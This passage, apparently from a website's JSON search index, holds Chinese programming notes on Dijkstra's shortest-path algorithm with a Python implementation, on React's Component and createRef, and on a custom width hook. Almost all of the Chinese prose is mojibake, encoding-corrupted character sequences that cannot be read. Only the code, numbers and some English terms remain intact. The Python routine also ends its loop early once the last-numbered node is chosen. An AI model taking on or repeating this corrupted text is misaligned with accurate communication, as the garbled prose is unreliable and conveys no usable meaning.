ç®—æ³•æ˜¯ä¸€ä¸ªåŸºäºã€Œè´ªå¿ƒã€ã€ã€Œå¹¿åº¦ä¼˜å…ˆæœç´¢ã€ã€ã€ŒåŠ¨æ€è§„åˆ’ã€æ±‚ä¸€ä¸ªå›¾ä¸­ä¸€ä¸ªç‚¹åˆ°å…¶ä»–æ‰€æœ‰ç‚¹çš„æœ€çŸ­è·¯å¾„çš„ç®—æ³•ï¼Œæ—¶é—´å¤æ‚åº¦ O(n&#94;2) å…¸å‹æœ€çŸ­è·¯å¾„ç®—æ³• ï¼Œç”¨äºè®¡ç®—ä¸€ä¸ªèŠ‚ç‚¹åˆ°å…¶ä»–èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„ã€‚ å®ƒçš„ä¸»è¦ç‰¹ç‚¹æ˜¯ä»¥èµ·å§‹ç‚¹ä¸ºä¸­å¿ƒå‘å¤–å±‚å±‚æ‰©å±•(å¹¿åº¦ä¼˜å…ˆéå†æ€æƒ³)ï¼Œç›´åˆ°æ‰©å±•åˆ°ç»ˆç‚¹ä¸ºæ­¢ã€‚ åŸºæœ¬æ­¥éª¤: Dijkstra ç®—æ³•ä»æŒ‡å®šçš„èŠ‚ç‚¹ï¼ˆæºèŠ‚ç‚¹ï¼‰å‡ºå‘ï¼Œå¯»æ‰¾å®ƒä¸å›¾ä¸­æ‰€æœ‰å…¶å®ƒèŠ‚ç‚¹ä¹‹é—´çš„æœ€çŸ­è·¯å¾„ã€‚ Dijkstra ç®—æ³•ä¼šè®°å½•å½“å‰å·²çŸ¥çš„æœ€çŸ­è·¯å¾„ï¼Œå¹¶åœ¨å¯»æ‰¾åˆ°æ›´çŸ­çš„è·¯å¾„æ—¶æ›´æ–°ã€‚ ä¸€æ—¦æ‰¾åˆ°æºèŠ‚ç‚¹ä¸å…¶ä»–èŠ‚ç‚¹ä¹‹é—´çš„æœ€çŸ­è·¯å¾„ï¼Œé‚£ä¸ªèŠ‚ç‚¹ä¼šè¢«æ ‡è®°ä¸º\"å·²è®¿é—®\"å¹¶æ·»åŠ åˆ°è·¯å¾„ä¸­ã€‚ é‡å¤å¯»æ‰¾è¿‡ç¨‹ï¼Œç›´åˆ°å›¾ä¸­æ‰€æœ‰èŠ‚ç‚¹éƒ½å·²ç»æ·»åŠ åˆ°è·¯å¾„ä¸­ã€‚ è¿™æ ·ï¼Œå°±å¯ä»¥å¾—åˆ°ä»æºèŠ‚ç‚¹å‡ºå‘è®¿é—®æ‰€æœ‰å…¶ä»–èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„æ–¹æ¡ˆã€‚ æ³¨è§£ Dijkstra åªèƒ½ç”¨åœ¨æƒé‡ä¸ºæ­£çš„å›¾ä¸­ï¼Œå› ä¸ºè®¡ç®—è¿‡ç¨‹ä¸­éœ€è¦å°†è¾¹çš„æƒé‡ç›¸åŠ æ¥å¯»æ‰¾æœ€çŸ­è·¯å¾„ã€‚ Dijkstra ç®—æ³•ç¤ºä¾‹ å¯»æ‰¾ 0 åˆ°å…¶å®ƒæ¯ä¸€ä¸ªèŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„. æ³¨è§£ å‡å®šä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„æƒé‡è¡¨ç¤ºå®ƒä»¬ä¹‹é—´çš„è·ç¦»ã€‚ æˆ‘ä»¬å°†ä¼šå¾—åˆ°èŠ‚ç‚¹ 0 åˆ°èŠ‚ç‚¹ 1ã€èŠ‚ç‚¹ 0 åˆ°èŠ‚ç‚¹ 2ã€èŠ‚ç‚¹ 0 åˆ° èŠ‚ç‚¹ 3â€¦â€¦ï¼ˆä»¥æ­¤ç±»æ¨ï¼‰çš„æœ€çŸ­è·¯å¾„ã€‚ åˆå§‹çš„è·ç¦»åˆ—è¡¨å¦‚ä¸‹ï¼š è¿˜æœ‰ä¸€ä¸ªåˆ—è¡¨ç”¨æ¥è®°å½•å“ªäº›èŠ‚ç‚¹æœªè¢«è®¿é—®ï¼ˆå³å°šæœªè¢«åŒ…å«åœ¨è·¯å¾„ä¸­ï¼‰ æ³¨è§£ å½“æ‰€æœ‰èŠ‚ç‚¹éƒ½è¢«æ·»åŠ åˆ°è·¯å¾„ä¸­æ—¶ï¼Œç®—æ³•çš„è®¡ç®—è¿‡ç¨‹å°±å®Œæˆäº†ã€‚ æˆ‘ä»¬é€‰æ‹©äº†ä»èŠ‚ç‚¹ 0 å‡ºå‘ï¼Œå¯ä»¥ç›´æ¥å°†å®ƒæ ‡è®°ä¸º\"å·²è®¿é—®\"ï¼Œ åŒæ ·çš„ï¼Œåœ¨æœªè®¿é—®èŠ‚ç‚¹åˆ—è¡¨ä¸­æŠŠå®ƒåˆ’æ‰ï¼Œå¹¶åœ¨å›¾ä¸­ç»™å®ƒåŠ ä¸Šçº¢è‰²çš„è¾¹æ¡†ï¼š ç°åœ¨éœ€è¦æ£€æŸ¥èŠ‚ç‚¹ 0 åˆ°ç›¸é‚»èŠ‚ç‚¹çš„è·ç¦»ï¼Œä¸¤ä¸ªç›¸é‚»èŠ‚ç‚¹åˆ†åˆ«æ˜¯èŠ‚ç‚¹ 1 å’ŒèŠ‚ç‚¹ 2ï¼ˆæ³¨æ„çœ‹çº¢è‰²çš„è¾¹ï¼‰ï¼š æ³¨è§£ è¿™å¹¶ä¸æ˜¯è¯´ç«‹å³æŠŠè¿™ä¸¤ä¸ªç›¸é‚»èŠ‚ç‚¹åŠ å…¥åˆ°æœ€çŸ­è·¯å¾„ä¸­ã€‚ åœ¨æŠŠä¸€ä¸ªèŠ‚ç‚¹åŠ å…¥åˆ°æœ€çŸ­è·¯å¾„ä¹‹å‰ï¼Œéœ€è¦ç¡®è®¤æ˜¯å¦å·²ç»å¯»æ‰¾åˆ°äº†è®¿é—®å®ƒçš„æœ€çŸ­è·¯å¾„ã€‚ ç°åœ¨åªæ˜¯åœ¨å¯¹å¯é€‰æ–¹æ¡ˆåšåˆæ­¥æ£€æŸ¥ã€‚ æ›´æ–°èŠ‚ç‚¹ 0 åˆ°èŠ‚ç‚¹ 1ã€èŠ‚ç‚¹ 0 åˆ°èŠ‚ç‚¹ 2 çš„è·ç¦»ä¸ºå®ƒä»¬ä¹‹é—´çš„è¾¹çš„æƒé‡ï¼Œåˆ†åˆ«ä¸º 2 å’Œ 6 æ›´æ–°äº†åˆ°ç›¸é‚»èŠ‚ç‚¹çš„è·ç¦»ä¹‹åï¼š æ ¹æ®å·²çŸ¥çš„è·ç¦»åˆ—è¡¨é€‰æ‹©è·ç¦»æºèŠ‚ç‚¹æœ€è¿‘çš„èŠ‚ç‚¹ã€‚ å°†å®ƒæ ‡è®°ä¸º\"å·²è®¿é—®\"ã€‚ å°†å®ƒæ·»åŠ åˆ°è·¯å¾„ä¸­ã€‚ æŸ¥çœ‹è·ç¦»åˆ—è¡¨ï¼Œå‘ç°èŠ‚ç‚¹ 1 åˆ°æºèŠ‚ç‚¹çš„è·ç¦»æ˜¯æœ€çŸ­çš„ï¼ˆè·ç¦»ä¸º 2ï¼‰ï¼Œæ‰€ä»¥æŠŠå®ƒåŠ å…¥åˆ°è·¯å¾„ä¸­ã€‚ åœ¨å›¾ä¸­ï¼Œä»¥çº¢è‰²è¾¹æ¥è¡¨ç¤ºï¼š åœ¨è·ç¦»åˆ—è¡¨ä¸­ç”¨çº¢è‰²æ–¹å—æ ‡è®°è¿™ä¸ªèŠ‚ç‚¹ï¼Œè¡¨æ˜å®ƒæ˜¯\"å·²è®¿é—®\"çš„ã€å·²ç»å¯»æ‰¾åˆ°äº†è®¿é—®è¿™ä¸ªèŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„ï¼š åœ¨æœªè®¿é—®èŠ‚ç‚¹åˆ—è¡¨ä¸­å°†å®ƒåˆ’æ‰ï¼š ç°åœ¨åˆ†ææ–°çš„ç›¸é‚»èŠ‚ç‚¹ï¼Œå¯»æ‰¾è®¿é—®å®ƒä»¬çš„æœ€çŸ­è·¯å¾„ã€‚ åªéœ€è¦åˆ†æå·²ç»åœ¨æœ€çŸ­è·¯å¾„ï¼ˆæ ‡è®°ä¸ºçº¢è‰²è¾¹ï¼‰ä¸­çš„èŠ‚ç‚¹çš„ç›¸é‚»èŠ‚ç‚¹ã€‚ èŠ‚ç‚¹ 2 å’ŒèŠ‚ç‚¹ 3 éƒ½æ˜¯æœ€çŸ­è·¯å¾„åŒ…å«çš„èŠ‚ç‚¹çš„ç›¸é‚»èŠ‚ç‚¹ï¼Œ å› ä¸ºå®ƒä»¬åˆ†åˆ«ä¸èŠ‚ç‚¹ 0 å’ŒèŠ‚ç‚¹ 1 ç›´æ¥ç›¸è¿ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ä¸‹ä¸€æ­¥å°†è¦åˆ†æè¿™ä¸¤ä¸ªèŠ‚ç‚¹ã€‚ ä¹‹å‰å·²ç»è®¡ç®—è¿‡æºèŠ‚ç‚¹åˆ°èŠ‚ç‚¹ 2 çš„è·ç¦»ï¼Œå¹¶è®°å½•åœ¨äº†åˆ—è¡¨ä¸­ï¼Œ æ‰€ä»¥ä¸ç”¨æ›´æ–°ã€‚è¿™æ¬¡åªéœ€è¦æ›´æ–°æºèŠ‚ç‚¹åˆ°æ–°çš„ç›¸é‚»èŠ‚ç‚¹ï¼ˆèŠ‚ç‚¹ 3ï¼‰çš„è·ç¦»ï¼š è¿™ä¸ªè·ç¦»æ˜¯ 7ï¼Œæ¥çœ‹çœ‹ä¸ºä»€ä¹ˆã€‚ ä¸ºäº†è®¡ç®—æºèŠ‚ç‚¹åˆ°å¦ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆè¿™é‡ŒæŒ‡èŠ‚ç‚¹ 3ï¼‰çš„è·ç¦»ï¼Œéœ€è¦æŠŠè®¿é—®è¯¥èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„çš„æ‰€æœ‰è¾¹æƒé‡ç›¸åŠ ï¼š å¯¹äºèŠ‚ç‚¹ 3ï¼š å°†æ„æˆè·¯å¾„ 0 -> 1 -> 3 çš„æ‰€æœ‰è¾¹æƒé‡ç›¸åŠ ï¼Œ å¾—åˆ°æ€»è·ç¦»ä¸º 7ï¼ˆ0 -> 1 è·ç¦»ä¸º 2ï¼Œ1 -> 3 è·ç¦»ä¸º 5ï¼‰ã€‚ ç°åœ¨å¾—åˆ°äº†åˆ°ç›¸é‚»èŠ‚ç‚¹çš„è·ç¦»ï¼Œéœ€è¦é€‰æ‹©ä¸€ä¸ªèŠ‚ç‚¹æ·»åŠ åˆ°è·¯å¾„ä¸­ã€‚ æˆ‘ä»¬å¿…é¡» é€‰æ‹©ä¸€ä¸ªå·²çŸ¥åˆ°æºèŠ‚ç‚¹è·ç¦»æœ€çŸ­çš„æœªè®¿é—®èŠ‚ç‚¹ ã€‚ å³é€‰æ‹© Distance ä¸­æœªç¡®å®šæœ€å°å€¼. ä»è·ç¦»åˆ—è¡¨ä¸­å¯ä»¥çœ‹å‡ºï¼Œè·ç¦»ä¸º 6 çš„èŠ‚ç‚¹ 2 å°±æ˜¯æˆ‘ä»¬çš„é€‰æ‹©ï¼š åœ¨å›¾ä¸­ä¸ºå®ƒåŠ ä¸Šçº¢è‰²è¾¹æ¡†ï¼Œå¹¶å°†è·¯å¾„ä¸Šçš„è¾¹æ ‡è®°ä¸ºçº¢è‰²ï¼š åœ¨è·ç¦»åˆ—è¡¨ä¸­ç”¨çº¢è‰²æ–¹å—æŠŠå®ƒæ ‡è®°ä¸º\"å·²è®¿é—®\"ï¼Œåœ¨\"æœªè®¿é—®\"èŠ‚ç‚¹åˆ—è¡¨ä¸­æŠŠå®ƒåˆ’æ‰ï¼š é‡å¤å‰é¢çš„æ­¥éª¤ï¼Œå¯»æ‰¾æºèŠ‚ç‚¹åˆ°æ–°çš„ç›¸é‚»èŠ‚ç‚¹èŠ‚ç‚¹ 3 çš„æœ€çŸ­è·¯å¾„ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸¤ç§å¯é€‰çš„è·¯å¾„ï¼š 0 -> 1 -> 3 æˆ– 0 -> 2 -> 3 ã€‚ä¸€èµ·çœ‹çœ‹æˆ‘ä»¬æ˜¯å¦‚ä½•ç¡®å®šæœ€çŸ­è·¯å¾„çš„ã€‚ èŠ‚ç‚¹ 3 åœ¨ä¹‹å‰å·²ç»æœ‰äº†ä¸€ä¸ªè·ç¦»è®°å½•ï¼ˆè·ç¦»ä¸º 7ï¼Œå‚é˜…ä¸‹è¡¨ï¼‰ï¼Œ è¿™ä¸ªè·ç¦»æ˜¯ä¹‹å‰æ­¥éª¤ä¸­ç”±è·¯å¾„ 0 -> 1 -> 3 çš„ä¸¤ä¸ªè¾¹æƒé‡ï¼ˆåˆ†åˆ«ä¸º 5 å’Œ 2ï¼‰ç›¸åŠ å¾—åˆ°çš„ã€‚ ä¸è¿‡ç°åœ¨æœ‰äº†ä¸€ä¸ªæ–°çš„å¯é€‰è·¯å¾„ï¼š 0 -> 2 -> 3 ï¼Œå®ƒé€”ç»æƒé‡åˆ†åˆ«ä¸º 6 å’Œ 8 çš„ä¸¤æ¡è¾¹ 0 -> 2 å’Œ 2 -> 3 ï¼Œæ€»è·ç¦»ä¸º 14ã€‚ æ˜¾ç„¶ï¼Œç¬¬ä¸€ä¸ªè·¯å¾„çš„è·ç¦»æ›´çŸ­ï¼ˆ7 vs. 14ï¼‰ï¼Œ æ‰€ä»¥é€‰æ‹©ç¬¬ä¸€ä¸ªè·¯å¾„ 0 -> 1 -> 3 ã€‚åªæœ‰åœ¨æ–°çš„è·¯å¾„è·ç¦»æ›´çŸ­çš„æƒ…å†µä¸‹ï¼Œæ‰ä¼šæ›´æ–°è·ç¦»åˆ—è¡¨ã€‚ å› æ­¤ï¼Œä½¿ç”¨ç¬¬ä¸€ç§æ–¹æ¡ˆ 0 -> 1 -> 3 ï¼Œå°†èŠ‚ç‚¹æ·»åŠ åˆ°è·¯å¾„ä¸­ã€‚ æŠŠè¿™ä¸ªèŠ‚ç‚¹æ ‡è®°ä¸º\"å·²è®¿é—®\"ï¼Œåœ¨\"æœªè®¿é—®\"èŠ‚ç‚¹åˆ—è¡¨ä¸­æŠŠå®ƒåˆ’æ‰ï¼š é‡å¤å‰é¢çš„è¿‡ç¨‹ã€‚ æ£€æŸ¥å°šæœªè®¿é—®çš„ç›¸é‚»èŠ‚ç‚¹ï¼šèŠ‚ç‚¹ 4 å’ŒèŠ‚ç‚¹ 5ï¼Œå› ä¸ºå®ƒä»¬æ˜¯èŠ‚ç‚¹ 3 çš„ç›¸é‚»èŠ‚ç‚¹ã€‚ æ›´æ–°å®ƒä»¬åˆ°æºèŠ‚ç‚¹çš„è·ç¦»ï¼Œå°è¯•å¯»æ‰¾æ›´çŸ­çš„è·¯å¾„ï¼š å¯¹äºèŠ‚ç‚¹ 4ï¼š è·¯å¾„æ˜¯ 0 -> 1 -> 3 -> 4 ï¼Œè·ç¦»ä¸º 17ã€‚ å¯¹äºèŠ‚ç‚¹ 5ï¼š è·¯å¾„æ˜¯ 0 -> 1 -> 3 -> 5 ï¼Œè·ç¦»ä¸º 22ã€‚ æ³¨è§£ æˆ‘ä»¬åªèƒ½ä»æœ€çŸ­è·¯å¾„ï¼ˆçº¢è‰²è¾¹ï¼‰ä¸Šè¿›è¡Œæ‰©å±•ï¼Œ è€Œä¸èƒ½é€”ç»æœªè¢«åŒ…å«åœ¨æœ€çŸ­è·¯å¾„ä¸­çš„è¾¹ï¼ˆä¾‹å¦‚ï¼Œä¸èƒ½æ„é€ ç»è¿‡è¾¹ 2 -> 3 çš„è·¯å¾„ï¼‰ã€‚ ç°åœ¨éœ€è¦é€‰æ‹©å°†å“ªä¸ªæœªè®¿é—®èŠ‚ç‚¹æ ‡è®°ä¸º\"å·²è®¿é—®\"ï¼Œè¿™é‡Œé€‰æ‹©èŠ‚ç‚¹ 4ï¼Œå› ä¸ºåœ¨è·ç¦»åˆ—è¡¨ä¸­å®ƒçš„è·ç¦»æœ€çŸ­ã€‚åœ¨å›¾ä¸­åšæ ‡è®°ï¼š åœ¨è·ç¦»åˆ—è¡¨ä¸­ç”¨çº¢è‰²æ–¹å—å°†å®ƒæ ‡è®°ä¸º\"å·²è®¿é—®\"ï¼š åœ¨\"æœªè®¿é—®\"èŠ‚ç‚¹åˆ—è¡¨ä¸­æŠŠå®ƒåˆ’æ‰ï¼š å†æ¬¡é‡å¤å‰é¢çš„è¿‡ç¨‹ã€‚æ£€æŸ¥ç›¸é‚»èŠ‚ç‚¹ï¼šèŠ‚ç‚¹ 5 å’ŒèŠ‚ç‚¹ 6ã€‚åˆ†ææ¯ä¸€ç§ä»å·²è®¿é—®èŠ‚ç‚¹åˆ°å®ƒä»¬ä¹‹é—´çš„å¯èƒ½è·¯å¾„æ–¹æ¡ˆã€‚ å¯¹äºèŠ‚ç‚¹ 5ï¼š ç¬¬ä¸€ç§é€‰æ‹©æ˜¯è·¯å¾„ 0 -> 1 -> 3 -> 5 ï¼Œåˆ°æºèŠ‚ç‚¹çš„è·ç¦»ä¸º 22ï¼ˆ2 + 5 + 15ï¼‰ï¼Œå‰é¢çš„æ­¥éª¤å·²ç»è®°å½•äº†è¿™ä¸ªè·ç¦»ã€‚ ç¬¬äºŒç§é€‰æ‹©æ˜¯è·¯å¾„ 0 -> 1 -> 3 -> 4 -> 5 ï¼Œåˆ°æºèŠ‚ç‚¹çš„è·ç¦»ä¸º 23ï¼ˆ2 + 5 + 10 + 6ï¼‰ã€‚ æ˜¾ç„¶ï¼Œç¬¬ä¸€ä¸ªè·¯å¾„è·ç¦»æ›´çŸ­ï¼Œä¸ºèŠ‚ç‚¹ 5 é€‰æ‹©ç¬¬ä¸€ç§æ–¹æ¡ˆã€‚ å¯¹äºèŠ‚ç‚¹ 6ï¼š å¯é€‰çš„è·¯å¾„æ˜¯ 0 -> 1 -> 3 -> 4 -> 6 ï¼Œåˆ°æºèŠ‚ç‚¹çš„è·ç¦»ä¸º 19ï¼ˆ2 + 5 + 10 + 2ï¼‰ã€‚ æŠŠè·ç¦»æœ€çŸ­ï¼ˆå½“å‰å·²çŸ¥ï¼‰çš„èŠ‚ç‚¹ 6 æ ‡è®°ä¸º\"å·²è®¿é—®\"ã€‚ åœ¨\"æœªè®¿é—®\"èŠ‚ç‚¹åˆ—è¡¨ä¸­æŠŠå®ƒåˆ’æ‰ï¼š ç°åœ¨å¾—åˆ°äº†å¦‚ä¸‹è·¯å¾„ï¼ˆæ ‡è®°ä¸ºçº¢è‰²ï¼‰ï¼š ç°åœ¨åªå‰©ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ 5 è¿˜æ²¡è¢«è®¿é—®äº†ï¼Œçœ‹çœ‹æˆ‘ä»¬è¦å¦‚ä½•æŠŠå®ƒæ·»åŠ åˆ°è·¯å¾„ä¸­ã€‚ ä»å·²ç»æ·»åŠ åˆ°è·¯å¾„ä¸­çš„èŠ‚ç‚¹å‡ºå‘ï¼Œæœ‰ä¸‰ç§ä¸åŒçš„è·¯å¾„å¯ä»¥è®¿é—®èŠ‚ç‚¹ 5ï¼š ç¬¬ä¸€ç§é€‰æ‹©ï¼š 0 -> 1 -> 3 -> 5 ï¼Œæ€»è·ç¦»ä¸º 22ï¼ˆ2 + 5 + 15ï¼‰ã€‚ ç¬¬äºŒç§é€‰æ‹©ï¼š 0 -> 1 -> 3 -> 4 -> 5 ï¼Œæ€»è·ç¦»ä¸º 23ï¼ˆ2 + 5 + 10 + 6ï¼‰ã€‚ ç¬¬ä¸‰ç§é€‰æ‹©ï¼š 0 -> 1 -> 3 -> 4 -> 6 -> 5 ï¼Œæ€»è·ç¦»ä¸º 25ï¼ˆ2 + 5 + 10 + 2 + 6ï¼‰ã€‚ é€‰æ‹©æ€»è·ç¦»ä¸º 22 çš„æœ€çŸ­è·¯å¾„ï¼š 0 -> 1 -> 3 -> 5 ã€‚ æŠŠè¿™ä¸ªèŠ‚ç‚¹æ ‡è®°ä¸º\"å·²è®¿é—®\"ï¼Œå¹¶åœ¨\"æœªè®¿é—®\"èŠ‚ç‚¹åˆ—è¡¨ä¸­æŠŠå®ƒåˆ’æ‰ï¼š ç§ï¼ æˆ‘ä»¬å¾—åˆ°äº†ä»èŠ‚ç‚¹ 0 åˆ°å›¾ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„ã€‚ å›¾ä¸­ï¼Œæ ‡è®°ä¸ºçº¢è‰²çš„è¾¹è¡¨ç¤ºæœ€çŸ­è·¯å¾„ï¼šè¿æ¥èŠ‚ç‚¹ 0 å’Œç›®æ ‡èŠ‚ç‚¹çš„çº¢è‰²è¾¹å³ä¸ºä»æºèŠ‚ç‚¹å‡ºå‘è®¿é—®ç›®æ ‡èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„ã€‚ ä¾‹å¦‚ï¼Œæƒ³è¦ä»èŠ‚ç‚¹ 0 å‡ºå‘è®¿é—®èŠ‚ç‚¹ 6ï¼Œè¿æ¥å®ƒä»¬çš„çº¢è‰²è¾¹å°±æ˜¯æœ€çŸ­è·¯å¾„ï¼Œè·Ÿç€èµ°å°±è¡Œäº†ã€‚ ä¸Šè¿°ä¾‹å­Pythonå®ç°: from math import inf from typing import List class Solution: def find(self, n: int, edges: List[List[int]]) -> list: # å°† edges è½¬æ¢ä¸º å›¾ g = [[inf] * n for _ in range(n)] for x, y, d in edges: g[x][y] = d g[y][x] = d # inf å½“å‰å·²å¯»æ‰¾å¥½è·ç¦», # False æ˜¯å¦ä½œä¸ºå¿…é¡»ç‚¹è¢«å¯»æ‰¾ # ç´¢å¼•ç›´æ¥è¡¨ç¤ºç‚¹ 0 - n-1 dis = [(inf, False)] * n # åˆ°è‡ªå·±çš„è·ç¦»ä¸º0 dis[0] = (0, False) while any(not x[1] for x in dis): x = -1 cur_d = inf for i, (d, al_find) in enumerate(dis): # æ‰¾å‡ºå½“å‰ æœªè®¿é—® ä¸­æœ€å°çš„ if not al_find and d < cur_d: x = i cur_d = d # if x == -1: break # æœ€åä¸€ä¸ªç‚¹çš„æ—¶å€™, è‚¯å®šå·²ç»æœ‰å…¶ä»–ç‚¹å…ˆéå†è¿‡äº†(åŒå‘ç‚¹), æ‰€ä»¥å¯ä»¥ç›´æ¥é€€å‡º if x == n-1: break # æ ‡è®°ä¸º å½“å¿…ç»è¿‡å½“å‰ç‚¹æ—¶ å·²æ‰¾è¿‡ dis[x] = (dis[x][0], True) for y, d in enumerate(g[x]): if d == inf or dis[y][1]: continue # ä¸å¯è¾¾ æˆ–è€… å·²ç»æ‰¾è¿‡, è·³è¿‡ new_d = d + dis[x][0] if new_d < dis[y][0]: dis[y] = (new_d, False) return [x[0] for x in dis] if __name__ == '__main__': dd = Solution().find( 7, [ [0, 1, 2], [0, 2, 6], [1, 3, 5], [2, 3, 8], [3, 5, 15], [3, 4, 10], [4, 5, 6], [4, 6, 2], [5, 6, 6], ] ) print(dd) å‚è€ƒ:: å›¾æ–‡è¯¦è§£ Dijkstra æœ€çŸ­è·¯å¾„ç®—æ³• https://www.cnblogs.com/goldsunshine/p/12978305.html , è¿™ä¸ªè¿˜æ²¡ä»”ç»†çœ‹, æµ…æµè§ˆäº†æ„Ÿè§‰å›¾æ¯”è¾ƒå…¨, æœ¬åœ°è§: ../../../resources/pdf/ä¸€ç¯‡æ–‡ç« è®²é€Dijkstraæœ€çŸ­è·¯å¾„ç®—æ³• - é‡‘è‰²æ—­å…‰ - åšå®¢å›­.pdf","tags":"æ•°æ®ç»“æ„","url":"/yq-doc-source-docs-data-structure-Greedy-algorithm-Dijkstra-(Dijiestra)-algorithm.html","loc":"/yq-doc-source-docs-data-structure-Greedy-algorithm-Dijkstra-(Dijiestra)-algorithm.html"},{"title":"Component","text":"ç±»ç»„ä»¶å®šä¹‰å¿…é¡»ç»§æ‰¿å…¶, å¹¶è‡³å°‘å®ç°å¯åŠ¨çš„ render() æ–¹æ³•. åŸå‹: React.Component<P, S> P æ˜¯ ç»„ä»¶æ¥å—çš„ç±»å‹, S è¡¨ç¤ºå½“å‰ç»„ä»¶çš„ state ç±»å‹","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-API-Component.html","loc":"/yq-doc-source-docs-front-end-frame-react-API-Component.html"},{"title":"createRef","text":"ä¸ å‡½æ•°ç»„ä»¶ çš„ /docs/å‰ç«¯/æ¡†æ¶/react/hooks/useRef åŸºæœ¬ä¸€è‡´. æ”¯æŒç±»ç»„ä»¶å’Œå‡½æ•°ç»„ä»¶. æ³¨è§£ å‡†ç¡®çš„è¯´, ä»…æ”¯æŒç±»ç»„ä»¶, å› ä¸º createRef åœ¨å‡½æ•°ç»„ä»¶ä¸­ å¹¶æ²¡æœ‰ Hooks çš„æ•ˆæœï¼Œå…¶å€¼ä¼šéšç€ FunctionComponent é‡å¤æ‰§è¡Œè€Œä¸æ–­è¢«åˆå§‹åŒ– ä¸ºä»€ä¹ˆ createRef å¯ä»¥åœ¨ ClassComponent æ­£å¸¸è¿è¡Œå‘¢ï¼Ÿ è¿™æ˜¯å› ä¸º ClassComponent åˆ†ç¦»äº†ç”Ÿå‘½å‘¨æœŸï¼Œä½¿ä¾‹å¦‚ componentDidMount ç­‰åˆå§‹åŒ–æ—¶æœºä»…æ‰§è¡Œä¸€æ¬¡ã€‚ Reactçš„æ•°æ®æµæ˜¯è‡ªä¸Šè€Œä¸‹çš„, æ„å‘³ç€å¦‚æœæƒ³è¦ä»çˆ¶ç»„ä»¶æ›´æ–°è‡ªç»„ä»¶, åªæœ‰æ›´æ–° Props å†è§¦å‘é‡æ–°æ¸²æŸ“. è€Œ Ref å¯ä»¥åˆ›å»ºä¸€ä¸ªå­ç»„ä»¶çš„å¼•ç”¨, ç»™çˆ¶ç»„ä»¶ç›´æ¥è°ƒç”¨. æ³¨è§£ Props æ˜¯å•å‘æ•°æ®æµï¼Œä»¥ å£°æ˜å¼ æ¸²æŸ“ç»„ä»¶ï¼›Ref åˆ™æ˜¯ä»¥ å‘½ä»¤å¼ æ“ä½œç»„ä»¶ã€‚ å‘½ä»¤å¼: æ‰“ç ´äº† Props çš„å•å‘æ•°æ®æµï¼Œç›´æ¥æ“ä½œå­å…ƒç´ ã€‚ ä» React16.3 å¼€å§‹, å®˜æ–¹æä¾›äº† createRef: class Parent extends React.Component { constructor(props) { super(props); this.myRef = React.createRef(); } componentDidMount() { const node = this.myRef.current; // ä½¿ç”¨ ref å¯¹è±¡ } render() { return <div ref={this.myRef}>Ref Example</div>; } } refå¯ä»¥ç›´æ¥æŒ‡å‘å®šä¹‰çš„å˜é‡å, ä½†æ˜¯ä½¿ç”¨çš„æ—¶å€™, éœ€è¦é¢å¤–åŠ ä¸ª current æ‰èƒ½è·å–å½“å‰å¼•ç”¨å®ä¾‹. é‡è¦ refä¸èƒ½æŒ‚åˆ°ä¸€ä¸ªå‡½æ•°å¼ç»„ä»¶ é‡è¦ å› ä¸ºå‘½ä»¤å¼ç ´åäº†åŸå…ˆçš„æ•°æ®æµï¼Œæ‰€ä»¥è¯·ä¸è¦æ»¥ç”¨ Ref å¯ä»¥ä½¿ç”¨ Props å®Œæˆçš„ï¼Œå»ºè®®ä¼˜å…ˆä½¿ç”¨å£°æ˜å¼çš„Propsã€‚ ä¾‹å¦‚ï¼šæˆ‘ä»¬å†™ä¸€ä¸ª\"å¯¹è¯æ¡†ç»„ä»¶\"ï¼Œæœ€å¥½ä½¿ç”¨ isOpen å±æ€§æ§åˆ¶å¼€å…³ï¼Œè€Œä¸æ˜¯æš´éœ² close() å’Œ open() æ–¹æ³•ã€‚ æ³¨è§£ React ä¼šåœ¨ç»„ä»¶æŒ‚è½½æ—¶ç»™ current å±æ€§ä¼ å…¥ DOM å…ƒç´ ï¼Œ å¹¶åœ¨ç»„ä»¶å¸è½½æ—¶ä¼ å…¥ null å€¼ã€‚ ref ä¼šåœ¨ componentDidMount æˆ– componentDidUpdate ç”Ÿå‘½å‘¨æœŸé’©å­è§¦å‘å‰æ›´æ–°ã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆref.currentæ€»èƒ½æ‹¿åˆ°æœ€æ–°å€¼çš„åŸå›  ä¸ä½¿ç”¨createRef reféœ€è¦æ‰‹åŠ¨èµ‹å€¼: class MyComponent extends React.Component { constructor(props) { super(props); this.myRef = null; } componentDidMount() { const node = this.myRef; // ä½¿ç”¨ ref å¯¹è±¡ } render() { return <div ref={ref => (this.myRef = ref)}>Ref Example</div>; } } æ•ˆæœæ„Ÿè§‰å·®ä¸å¤š.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-react-hooks-Createe.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-Createe.html"},{"title":"è‡ªå®šä¹‰Hook","text":"ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ª hook å®æ—¶è·å–é¡µé¢çš„å®½åº¦: // åˆ›å»ºä¸€ä¸ªåä¸ºuseWidthçš„hook function useWidth () { // 1. å£°æ˜ä¸€ä¸ªå®½åº¦çš„state const [width, setWidth] = useState(window.innerWidth); useEffect(() => { function handleResize() { // 2. æ¯å½“å±å¹•resizeæ—¶ï¼Œæ›´æ–°width setWidth(window.innerWidth); } // 3. æ·»åŠ ç›‘å¬äº‹ä»¶ window.addEventListener(\"resize\", handleResize); // 4. è¿”å›ä¸€ä¸ªç§»å‡ºäº‹ä»¶çš„å‡½æ•° return () => window.removeEventListener(\"resize\", handleResize); }, []); return width; } ä½¿ç”¨: function App () { // ä½¿ç”¨è‡ªå®šä¹‰hook const width = useWidth(); return <div>å½“å‰å±å¹•å®½åº¦ä¸º{width}</div> } 